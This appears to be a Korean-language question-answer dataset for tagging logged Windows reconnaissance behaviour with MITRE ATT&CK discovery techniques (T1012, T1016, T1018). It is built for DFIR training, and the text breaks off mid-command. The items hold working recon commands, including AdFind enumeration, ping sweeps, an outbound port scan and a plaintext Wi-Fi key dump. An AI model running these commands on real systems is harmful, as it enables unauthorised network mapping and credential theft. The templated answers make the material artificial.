{"id": "T1012_T1012-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1012 Query Registry (Tactic: Discovery)\n[요약] reg.exe를 사용해 HKLM\\SYSTEM\\CurrentControlSet\\Control 키의 SystemStartOptions 값을 조회해 시스템 부팅 옵션(부팅 모드, 디버그 설정 등)을 확인한다. 이는 보안 관련 부팅 설정을 파악하는 데 사용될 수 있다.\n[절차] cmd.exe에서 reg.exe query HKLM\\SYSTEM\\CurrentControlSet\\Control /v SystemStartOptions 명령을 실행한다. 출력된 SystemStartOptions 문자열에서 부팅 모드(예: SAFEBOOT, NOEXECUTE 정책, 디버그 플래그 등)를 확인한다. 공격자는 이를 통해 보안 정책(예: 커널 DEP, 드라이버 서명 강제 등)이나 부팅 환경 제약을 파악할 수 있다.\n[대표 명령 예시]\nreg.exe query HKLM\\SYSTEM\\CurrentControlSet\\Control /v SystemStartOptions\n[기존 태그] action=[registry_query] domain=[Discovery] ttp=[Query_Registry, Boot_Option_Inspection]", "answer": "이 행위는 MITRE ATT&CK의 T1012 \"Query Registry\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1016_T1016-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1016 System Network Configuration Discovery (Tactic: Discovery)\n[요약] ipconfig, netsh, arp, nbtstat, net config 등을 이용해 기본 네트워크 설정, 인터페이스 상태, ARP 캐시, NetBIOS 이름, 네트워크 서비스 구성을 조회한다.\n[절차] cmd.exe에서 ipconfig /all을 실행해 어댑터별 IP 주소, 서브넷 마스크, 게이트웨이, DNS 서버, DHCP 상태 등을 확인한다. netsh interface show interface로 네트워크 인터페이스 목록과 상태(Enabled/Disabled, Connected 등)를 조회한다. arp -a로 현재 ARP 캐시를 출력해 같은 서브넷에 통신한 호스트의 IP/MAC 정보를 확인한다. nbtstat -n으로 로컬 NetBIOS 이름과 등록된 이름들을 확인한다. net config 명령으로 워크스테이션/서버 서비스의 기본 네트워크 구성을 확인한다.\n[대표 명령 예시]\nipconfig /all\r\nnetsh interface show interface\r\narp -a\r\nnbtstat -n\r\nnet config\n[기존 태그] action=[net_enum, config_discovery] domain=[Discovery] ttp=[Network_Config_Enumeration]", "answer": "이 행위는 MITRE ATT&CK의 T1016 \"System Network Configuration Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1016_T1016-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1016 System Network Configuration Discovery (Tactic: Discovery)\n[요약] netsh advfirewall firewall show rule name=all 명령으로 로컬 Windows 방화벽 규칙 전체를 나열해 인바운드/아웃바운드 허용·차단 상태를 확인한다.\n[절차] cmd.exe에서 netsh advfirewall firewall show rule name=all 명령을 실행한다. 출력 결과에서 프로그램 경로, 포트, 프로토콜, 프로필(도메인/프라이빗/공용), 동작(허용/차단) 정보를 확인한다. 공격자는 이를 통해 이미 허용된 포트나 프로그램을 악용해 C2 통신이나 데이터 유출을 시도할 수 있다.\n[대표 명령 예시]\nnetsh advfirewall firewall show rule name=all\n[기존 태그] action=[firewall_enum] domain=[Discovery] ttp=[Firewall_Rule_Enumeration]", "answer": "이 행위는 MITRE ATT&CK의 T1016 \"System Network Configuration Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1016_T1016-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1016 System Network Configuration Discovery (Tactic: Discovery)\n[요약] TrickBot 악성코드에서 관찰된 것과 유사하게 ipconfig, net config workstation, net view, nltest를 사용해 네트워크 구성과 도메인 정보를 수집한다.\n[절차] ipconfig /all로 네트워크 인터페이스 설정을 조회한다. net config workstation으로 워크스테이션 이름, 도메인/워크그룹, 로그온 도메인 등의 정보를 수집한다. net view /all /domain으로 도메인 내 공유 리소스 및 컴퓨터 목록을 열거한다. nltest /domain_trusts 명령을 통해 도메인 트러스트 관계를 조회해 다른 도메인으로의 이동 가능성을 파악한다.\n[대표 명령 예시]\nipconfig /all\r\nnet config workstation\r\nnet view /all /domain\r\nnltest /domain_trusts\n[기존 태그] action=[net_enum, ad_enum] domain=[Discovery] ttp=[TrickBot_Like_Recon]", "answer": "이 행위는 MITRE ATT&CK의 T1016 \"System Network Configuration Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1016_T1016-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1016 System Network Configuration Discovery (Tactic: Discovery)\n[요약] PowerShell로 사전 정의된 포트 목록을 읽어 allports.exposed 호스트에 TCP 연결을 시도해 아웃바운드로 열려 있는 포트를 식별하고 결과를 파일로 저장한다.\n[절차] 사전 조건으로 top-128.txt 파일을 다운로드하여 포트 목록(기본 128개 인기 포트)을 준비한다. PowerShell에서 포트 파일을 읽어 각 포트에 대해 System.Net.Sockets.TcpClient로 allports.exposed:포트에 연결을 시도한다. 연결 성공 시 \"<port> open\", 실패 시 \"<port> closed\"를 콘솔과 결과 파일(#{output_file})에 기록한다. 모든 포트 테스트 후 총 오픈 포트 수와 전체 테스트 포트 수를 요약해 파일 마지막 줄에 추가한다.\n[대표 명령 예시]\n$ports = Get-content \"#{port_file}\"\r\n$file = \"#{output_file}\"\r\n$totalopen = 0\r\n$totalports = 0\r\nNew-Item $file -Force | Out-Null\r\nforeach ($port in $ports) {\r\n    $test = New-Object system.Net.Sockets.TcpClient\r\n    $wait = $test.BeginConnect(\"allports.exposed\", $port, $null, $null)\r\n    $wait.AsyncWaitHandle.WaitOne(250, $false) | Out-Null\r\n    $totalports++ | Out-Null\r\n    if ($test.Connected) {\r\n        $result = \"$port open\"\r\n        Write-Host $result\r\n        $result | Out-File -Encoding ASCII -Append $file\r\n        $totalopen++ | Out-Null\r\n    }\r\n    else {\r\n        $result = \"$port closed\"\r\n        Write-Host $result\r\n        $totalclosed++ | Out-Null\r\n        $result | Out-File -Encoding ASCII -Append $file\r\n    }\r\n}\r\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\r\n$results | Out-File -Encoding ASCII -Append $file\r\nWrite-Host $results\n[기존 태그] action=[egress_test, port_scan] domain=[Discovery] ttp=[Outbound_Port_Enumeration]", "answer": "이 행위는 MITRE ATT&CK의 T1016 \"System Network Configuration Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1016_T1016-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1016 System Network Configuration Discovery (Tactic: Discovery)\n[요약] AdFind.exe를 사용해 AD 환경에서 objectcategory=subnet 객체를 검색하여 서브넷 정보를 열거한다. 랜섬웨어·침해 사례에서 관측된 정찰 기법이다.\n[절차] 사전 조건으로 PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe를 다운로드해 준비한다. cmd.exe에서 AdFind.exe -f (objectcategory=subnet) #{optional_args} 명령을 실행한다. 출력 결과에서 AD에 정의된 서브넷 이름, 주소, 사이트 매핑 정보를 확인한다. 공격자는 이를 통해 네트워크 세그먼트 구조와 AD 사이트 설계를 파악할 수 있다.\n[대표 명령 예시]\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=subnet) #{optional_args}\n[기존 태그] action=[ad_enum, subnet_enum] domain=[Discovery] ttp=[AD_Subnet_Enumeration]", "answer": "이 행위는 MITRE ATT&CK의 T1016 \"System Network Configuration Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1016_T1016-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1016 System Network Configuration Discovery (Tactic: Discovery)\n[요약] Qakbot 악성코드에서 관찰된 정찰용 명령 모음을 배치 파일(qakbot.bat)로 실행해 네트워크·도메인 정보를 수집한다.\n[절차] 사전 조건으로 PathToAtomicsFolder\\\\T1016\\\\src\\\\qakbot.bat 파일을 다운로드한다. cmd.exe에서 qakbot.bat 스크립트를 그대로 실행한다. 스크립트 내부에서 ipconfig, net, nltest 등 다양한 네트워크·도메인 관련 명령을 순차적으로 호출해 결과를 표준 출력으로 남긴다. 공격자는 동일한 명령 세트를 통해 네트워크 구조, 도메인 정보, 공유 리소스 등을 한 번에 수집할 수 있다.\n[대표 명령 예시]\n\"#{recon_commands}\"\n[기존 태그] action=[net_enum, recon_script] domain=[Discovery] ttp=[Qakbot_Style_Recon]", "answer": "이 행위는 MITRE ATT&CK의 T1016 \"System Network Configuration Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1016_T1016-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1016 System Network Configuration Discovery (Tactic: Discovery)\n[요약] nslookup을 이용해 _ldap._tcp.dc._msdcs.<도메인> 레코드에 질의하여 도메인 컨트롤러 DNS 정보를 조회한다. Qakbot 등이 도메인 정보 수집에 사용하는 방식이다.\n[절차] cmd.exe에서 nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN% 명령을 실행한다. DNS 응답에서 도메인 컨트롤러 FQDN, IP 주소 및 LDAP 서비스 관련 레코드를 확인한다. 공격자는 이를 통해 AD 도메인 컨트롤러 위치를 파악하고 후속 공격(인증 시도, Kerberos·LDAP 악용 등)을 계획할 수 있다.\n[대표 명령 예시]\nnslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%\n[기존 태그] action=[dns_enum, dc_discovery] domain=[Discovery] ttp=[DNS_Server_Discovery, Domain_Controller_Enumeration]", "answer": "이 행위는 MITRE ATT&CK의 T1016 \"System Network Configuration Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1016.001_T1016.001-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1016.001 System Network Configuration Discovery: Internet Connection Discovery (Tactic: Discovery)\n[요약] Windows에서 ping 명령을 사용해 8.8.8.8 등 외부 호스트로 ICMP 에코 요청을 보내 인터넷 연결 상태를 확인한다.\n[절차] cmd.exe를 사용해 ping 명령을 실행한다. 기본 대상은 8.8.8.8(구글 Public DNS)이며, 필요 시 #{ping_target} 인자를 다른 IP 또는 호스트로 변경한다. ping -n 4 #{ping_target} 명령을 통해 4회 ICMP 요청을 보내고 응답 시간, 손실률 등을 확인한다. 응답이 없거나 100% 손실일 경우 방화벽/라우팅/프록시 등의 영향으로 외부 네트워크 접속이 제한되어 있을 가능성을 고려한다.\n[대표 명령 예시]\nping -n 4 #{ping_target}\n[기존 태그] action=[connectivity_check, icmp_probe] domain=[Discovery] ttp=[Internet_Connectivity_Probe]", "answer": "이 행위는 MITRE ATT&CK의 T1016.001 \"System Network Configuration Discovery: Internet Connection Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1016.001_T1016.001-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1016.001 System Network Configuration Discovery: Internet Connection Discovery (Tactic: Discovery)\n[요약] PowerShell의 Test-NetConnection cmdlet을 사용해 ICMP(Ping) 기반으로 지정한 대상(기본 8.8.8.8)의 연결 상태를 점검한다.\n[절차] PowerShell 세션을 연다. Test-NetConnection -ComputerName #{target} 명령을 실행해 ICMP 핑을 포함한 연결 상태를 확인한다. 출력 결과에서 PingSucceeded, RoundTripTime 등 필드를 확인해 인터넷 또는 대상 호스트와의 연결이 정상인지 판단한다. 필요 시 #{target} 값을 다른 IP 또는 도메인으로 변경해 특정 서비스 또는 네트워크 구간을 점검한다.\n[대표 명령 예시]\nTest-NetConnection -ComputerName #{target}\n[기존 태그] action=[connectivity_check, icmp_probe] domain=[Discovery] ttp=[Internet_Connectivity_Probe_PS]", "answer": "이 행위는 MITRE ATT&CK의 T1016.001 \"System Network Configuration Discovery: Internet Connection Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1016.001_T1016.001-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1016.001 System Network Configuration Discovery: Internet Connection Discovery (Tactic: Discovery)\n[요약] PowerShell의 Test-NetConnection을 사용해 TCP 80(HTTP) 포트 기준으로 외부 웹 사이트(기본 www.google.com)와의 연결 가능 여부를 확인한다.\n[절차] PowerShell에서 Test-NetConnection -CommonTCPPort HTTP -ComputerName #{target} 명령을 실행한다. 출력 결과에서 TcpTestSucceeded, RemotePort, RemoteAddress 등의 필드를 확인해 HTTP 포트(80)로의 아웃바운드 접속이 가능한지 판단한다. 프록시, 방화벽, DNS 설정 등에 따라 실패할 수 있으며, 공격자는 이를 기반으로 C2 통신에 사용할 도메인/포트 전략을 조정할 수 있다.\n[대표 명령 예시]\nTest-NetConnection -CommonTCPPort HTTP -ComputerName #{target}\n[기존 태그] action=[connectivity_check, http_egress_test] domain=[Discovery] ttp=[HTTP_Egress_Test]", "answer": "이 행위는 MITRE ATT&CK의 T1016.001 \"System Network Configuration Discovery: Internet Connection Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1016.001_T1016.001-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1016.001 System Network Configuration Discovery: Internet Connection Discovery (Tactic: Discovery)\n[요약] PowerShell의 Test-NetConnection을 사용해 TCP 445(SMB) 포트 기준으로 외부 호스트(기본 8.8.8.8)에 대한 SMB 아웃바운드 연결 가능 여부를 점검한다.\n[절차] PowerShell에서 Test-NetConnection -CommonTCPPort SMB -ComputerName #{target} 명령을 실행한다. TcpTestSucceeded 값이 True인지 확인해, 외부로 SMB(445/tcp) 연결이 허용되는지 판단한다. 조직 정책상 외부 SMB가 차단되어야 정상인 환경도 있으므로, 결과를 정책과 비교해 해석한다. 공격자는 SMB가 외부로 열려 있을 경우, SMB 터널링이나 파일 공유 기반 데이터 유출 채널로 악용할 수 있다.\n[대표 명령 예시]\nTest-NetConnection -CommonTCPPort SMB -ComputerName #{target}\n[기존 태그] action=[connectivity_check, smb_egress_test] domain=[Discovery] ttp=[SMB_Egress_Test]", "answer": "이 행위는 MITRE ATT&CK의 T1016.001 \"System Network Configuration Discovery: Internet Connection Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1016.002_T1016.002-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1016.002 System Network Configuration Discovery: Wi-Fi Discovery (Tactic: Discovery)\n[요약] Windows의 netsh wlan 명령을 사용해 이 시스템에 저장된 Wi-Fi 프로필과 해당 키(있을 경우)를 평문으로 나열한다.\n[절차] cmd.exe를 연다. netsh wlan show profile * key=clear 명령을 실행한다. 출력 결과에서 다음 정보를 확인한다:   - 저장된 모든 Wi-Fi 프로필(SSID) 이름   - 각 프로필의 인증/암호화 방식   - '보안 키' 항목과 '키 콘텐츠(Key Content)'에 표시되는 평문 패스워드(존재하는 경우) 획득한 SSID 및 패스워드 정보를 이용해 동일 네트워크에 재접속하거나, 다른 장비에 연결을 시도할 수 있다.\n[대표 명령 예시]\nnetsh wlan show profile * key=clear\n[기존 태그] action=[wifi_profile_enum, credential_discovery] domain=[Discovery] ttp=[WiFi_Profile_And_Key_Enumeration]", "answer": "이 행위는 MITRE ATT&CK의 T1016.002 \"System Network Configuration Discovery: Wi-Fi Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] net.exe를 사용해 도메인 및 로컬 네트워크에서 공유가 활성화된 시스템 목록을 조회한다. 기본적인 SMB/브라우저 기반 원격 호스트 정찰 시나리오이다.\n[절차] cmd.exe를 실행한다. net view /domain 명령으로 도메인 브라우저 목록을 조회한다. net view 명령으로 로컬 네트워크에서 공유가 열려 있는 시스템 목록을 조회한다. 출력 결과를 기반으로 추가 정찰 또는 측면 이동 대상 시스템을 선별한다.\n[대표 명령 예시]\nnet view /domain && net view", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] net.exe를 사용해 Active Directory의 \"Domain Computers\" 그룹을 조회한다. 도메인에 가입된 워크스테이션과 서버 목록을 한 번에 확인하는 정찰 기법이다.\n[절차] cmd.exe를 실행한다. net group \"Domain Computers\" /domain 명령을 실행해 도메인 컴퓨터 그룹을 조회한다. 출력된 시스템 목록을 기반으로 추가 스캔 또는 측면 이동 대상을 선정한다.\n[대표 명령 예시]\nnet group \"Domain Computers\" /domain", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] nltest.exe를 이용해 특정 도메인의 도메인 컨트롤러 목록을 조회한다. 공격자는 DC를 식별해 인증 공격, 티켓 도난, 측면 이동 대상으로 활용할 수 있다.\n[절차] cmd.exe 또는 PowerShell에서 target_domain 값을 확인한다(기본: %userdnsdomain%). nltest.exe /dclist:<domain> 명령을 실행한다. 출력된 도메인 컨트롤러 목록을 분석해 핵심 인프라 시스템을 파악한다.\n[대표 명령 예시]\nnltest.exe /dclist:%userdnsdomain%", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] 간단한 for 루프와 ping 명령을 사용해 지정된 서브넷(기본 192.168.1.0/24)에 대해 ping sweep을 수행한다. 응답하는 IP를 통해 활성 호스트를 식별한다.\n[절차] 시작/종료 호스트 및 서브넷 값을 설정한다(예: start=1, stop=254, subnet=192.168.1). cmd.exe에서 for /l 루프를 사용해 각 IP로 ping -n 1 -w 100을 수행한다. 응답 결과를 눈으로 확인하거나 로그 리다이렉션을 통해 저장해 분석한다.\n[대표 명령 예시]\nfor /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] arp -a 명령을 사용해 로컬 시스템의 ARP 캐시를 조회한다. 최근 통신한 로컬 세그먼트 내 호스트의 IP/MAC 정보를 확인할 수 있다.\n[절차] cmd.exe를 실행한다. arp -a 명령을 사용해 현재 ARP 캐시를 덤프한다. IP–MAC 매핑 정보를 바탕으로 로컬 네트워크 상의 활성 호스트를 식별한다.\n[대표 명령 예시]\narp -a", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] PowerShell에서 로컬 IP를 기준으로 /24 대역을 계산한 후, 각 IP에 대해 nslookup을 수행해 이름을 조회한다. 역방향 DNS를 통해 활성 호스트와 호스트명을 수집하는 기법이다.\n[절차] ipconfig 출력에서 첫 번째 IPv4 주소를 파싱해 /24 서브넷의 앞 세 옥텟을 추출한다. 1~255 범위의 마지막 옥텟에 대해 반복문을 돌며 nslookup을 실행한다. 역방향 DNS가 설정된 IP에 대해 호스트명을 수집한다.\n[대표 명령 예시]\n$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split('.'); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255) { cmd.exe /c nslookup \"$firstOctet.$secondOctet.$thirdOctet.$ip\" }", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] adidnsdump 도구를 사용해 Active Directory 통합 DNS 존의 레코드를 덤프한다. 내부 네트워크의 서버, 워크스테이션, 서비스 레코드를 한 번에 수집하는 고급 정찰 기법이다.\n[절차] Python 3과 adidnsdump가 설치된 가상환경(venv)을 준비한다. 도메인 계정 자격 증명과 타깃 DNS 서버/도메인 컨트롤러 정보를 설정한다. adidnsdump -u <user> -p <pass> --print-zones <host> 명령을 실행한다. 출력된 DNS 존과 레코드 목록을 분석해 내부 자산 구조를 파악한다.\n[대표 명령 예시]\nPathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1018\\Scripts\\adidnsdump -u domain\\user -p password --print-zones 192.168.1.1", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-8_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] AdFind.exe를 이용해 objectcategory=computer 조건으로 AD에서 컴퓨터 객체를 열거한다. 랜섬웨어 그룹 등에서 내부 호스트 목록 수집에 활용된 정찰 패턴이다.\n[절차] 지정된 경로에 AdFind.exe가 존재하는지 확인한다. 필요하다면 GitHub 등에서 AdFind.exe를 내려받아 ExternalPayloads 경로에 저장한다. \"AdFind.exe -f (objectcategory=computer)\" 명령을 실행한다. 출력된 컴퓨터 객체 목록을 바탕으로 추가 공격 대상을 선정한다.\n[대표 명령 예시]\nPathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe -f (objectcategory=computer)", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-9_Q9", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] AdFind.exe를 사용해 도메인 컨트롤러 객체를 열거한다. -sc dclist 스위치를 통해 도메인 내 DC 목록을 빠르게 확인할 수 있다.\n[절차] 지정된 경로에 AdFind.exe가 있는지 확인한다. cmd.exe에서 \"AdFind.exe -sc dclist\" 또는 추가 인자를 포함한 명령을 실행한다. 출력 결과에서 도메인 컨트롤러의 이름과 정보를 확인한다.\n[대표 명령 예시]\nPathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe -sc dclist", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-10_Q10", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] PowerShell에서 System.DirectoryServices.DirectorySearcher를 사용해 AD 내 Computer 객체를 검색한다. 추가 도구 없이 .NET API만으로 도메인 컴퓨터 목록을 얻는 방법이다.\n[절차] 테스트 시스템이 도메인에 조인되어 있는지 확인한다. PowerShell에서 DirectorySearcher를 생성하고 필터를 \"(ObjectCategory=Computer)\"로 설정한다. Search 결과의 name 속성을 순회하며 컴퓨터 이름을 출력한다.\n[대표 명령 예시]\n$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\"); $DirectorySearcher.PropertiesToLoad.Add(\"Name\") | Out-Null; $Computers = $DirectorySearcher.FindAll(); foreach ($Computer in $Computers) { 